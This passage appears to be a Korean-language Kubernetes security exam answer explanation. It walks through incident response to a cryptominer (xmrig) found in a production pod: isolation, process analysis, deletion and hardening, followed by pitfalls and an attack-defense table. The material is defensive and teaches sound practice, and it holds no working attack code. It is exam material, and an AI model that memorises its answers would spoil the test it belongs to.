# 1단계: 격리 확인 - NetworkPolicy 적용 후 통신 차단 확인
kubectl exec web-7d8f9 -n production -- wget -qO- --timeout=2 http://other-svc:80
```
```text
wget: download timed out
command terminated with exit code 1
```
```bash
# 2단계: 프로세스 분석
kubectl exec web-7d8f9 -n production -- ps aux
```
```text
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1  10640  5480 ?        Ss   10:00   0:00 nginx: master process
www-data    10  0.0  0.0  11084  2616 ?        S    10:00   0:00 nginx: worker process
root        25  5.0  1.0  25000 10000 ?        R    10:15   0:30 /tmp/xmrig --donate-level=1
```
```bash
# 의심스러운 프로세스 발견: /tmp/xmrig (크립토마이너)
kubectl exec web-7d8f9 -n production -- ls -la /tmp/
```
```text
-rwxr-xr-x 1 root root 5242880 Mar 30 10:14 xmrig
-rw-r--r-- 1 root root     256 Mar 30 10:14 config.json
```
```bash
# 3단계: Pod 삭제 후 보안 강화된 Deployment 확인
kubectl delete pod web-7d8f9 -n production
kubectl rollout status deployment web -n production
```
```text
deployment "web" successfully rolled out
```
```bash
# 4단계: 새 Pod에서 보안 설정 확인
NEW_POD=$(kubectl get pod -n production -l app=web -o name | head -1)
kubectl exec -it $NEW_POD -n production -- touch /tmp/test
```
```text
touch: /tmp/test: Read-only file system
```
```bash
# 격리 정책 제거 후 정상 통신 확인
kubectl delete networkpolicy isolate-compromised-pod -n production
```

**출제 의도:** 실시간 보안 사고에 대한 완전한 인시던트 대응(IR) 절차를 수행하는 능력을 검증한다. 격리-분석-제거-강화의 4단계 프로세스를 이해해야 한다.

**핵심 원리:** 보안 사고 대응은 NIST SP 800-61에 따른 절차를 따른다: (1) **격리(Containment)** - NetworkPolicy로 감염된 Pod의 네트워크를 차단하여 데이터 유출과 횡적 이동을 방지한다. (2) **분석(Analysis)** - 프로세스 목록(`ps aux`), 파일 시스템(`ls`, `find`), 네트워크 연결(`ss`, `netstat`)을 조사하여 침해 범위를 파악한다. (3) **제거(Eradication)** - 감염된 Pod를 삭제한다. Deployment가 새 Pod를 자동 생성한다. (4) **강화(Recovery)** - securityContext를 강화하여 동일한 공격 벡터를 차단한다.

**함정과 주의사항:**
- Pod를 즉시 삭제하면 포렌식 증거가 사라진다. 먼저 격리하고 분석한 후에 삭제하라.
- NetworkPolicy로 격리할 때 `pod-template-hash`를 사용하면 해당 ReplicaSet의 특정 Pod만 격리할 수 있다. 그러나 이 라벨은 Deployment가 자동 생성하므로 정확한 값을 확인해야 한다.
- `readOnlyRootFilesystem`을 추가할 때 emptyDir 마운트를 빠뜨리면 새 Pod가 시작되지 않는다. 롤아웃 상태를 반드시 확인하라.
- 격리 정책은 사고 대응 완료 후 반드시 제거해야 한다. 남겨두면 정상 트래픽도 차단된다.
- 시험에서는 시간이 제한되므로, 격리 -> Pod 삭제 -> 강화 순서를 빠르게 수행하되 각 단계의 검증을 빠뜨리지 말라.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| 크립토마이너 설치 후 C2 통신 | NetworkPolicy 격리로 외부 통신 차단 |
| 횡적 이동으로 다른 서비스 침해 | 네트워크 격리로 내부 통신 차단 |
| 동일 취약점을 통한 재침해 | readOnlyRootFilesystem + seccomp 강화로 재발 방지 |
| 루트 권한을 이용한 호스트 탈출 | runAsNonRoot + capabilities drop으로 권한 최소화 |
</details>
